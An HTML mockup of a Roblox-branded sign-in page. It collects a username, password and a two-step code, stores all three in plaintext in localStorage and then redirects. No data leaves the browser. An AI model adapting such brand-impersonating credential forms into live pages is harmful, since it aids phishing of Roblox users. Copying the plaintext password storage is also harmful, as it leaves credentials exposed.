<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Roblox Style Login</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  height: 100vh;
  overflow: hidden;
  /* Replace with your own background image if needed */
  background: url('bg.jpg') no-repeat center center fixed;
  background-size: cover;
}

/* LOGIN BOX */
.box {
  position: absolute;
  top:50%;
  left:50%;
  transform: translate(-50%, -50%);
  
  background: rgba(15,15,15,0.85);
  padding: 30px;
  width: 320px;
  border-radius: 12px;
  text-align: center;
  color: white;
  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
}

.box h2 {
  margin-bottom: 20px;
  font-family: 'Arial Black', sans-serif;
  letter-spacing: 2px;
}

input {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border-radius: 8px;
  border: none;
  outline: none;
  background: #2a2a2a;
  color: white;
}

button {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border: none;
  border-radius: 8px;
  font-weight: bold;
  cursor: pointer;
}

#signInBtn { background: #fff; color: #000; }
#verifyBtn { background: #0f0; color: #000; display: none; }

.link {
  margin-top: 10px;
  font-size: 13px;
  color: #ccc;
}
</style>
</head>

<body>

<div class="box">
  <h2>ROBLOX</h2>

  <input type="text" id="username" placeholder="Username/Email">
  <input type="password" id="password" placeholder="Password">
  <input type="text" id="twoStep" placeholder="2-Step Code" style="display:none;">

  <button id="signInBtn">Sign In</button>
  <button id="verifyBtn">Verify</button>

  <div class="link">Forgot Password?</div>
</div>

<script>
const signInBtn = document.getElementById('signInBtn');
const verifyBtn = document.getElementById('verifyBtn');

signInBtn.onclick = () => {
  const user = document.getElementById('username').value;
  const pass = document.getElementById('password').value;

  if(user && pass){
    // Show 2-step input
    document.getElementById('twoStep').style.display = 'block';
    signInBtn.style.display = 'none';
    verifyBtn.style.display = 'block';
    alert('Use code: 123456');
  } else {
    alert('Enter all fields');
  }
};

verifyBtn.onclick = () => {
  const code = document.getElementById('twoStep').value;

  if(code === '123456'){
    alert('Login successful!');
    // Save info to localStorage (optional)
    localStorage.setItem('username', document.getElementById('username').value);
    localStorage.setItem('password', document.getElementById('password').value);
    localStorage.setItem('twoStepCode', code);
    
    // Redirect to html.html
    window.location.href = 'html.html';
  } else {
    alert('Wrong code');
  }
};
</script>

</body>
</html>
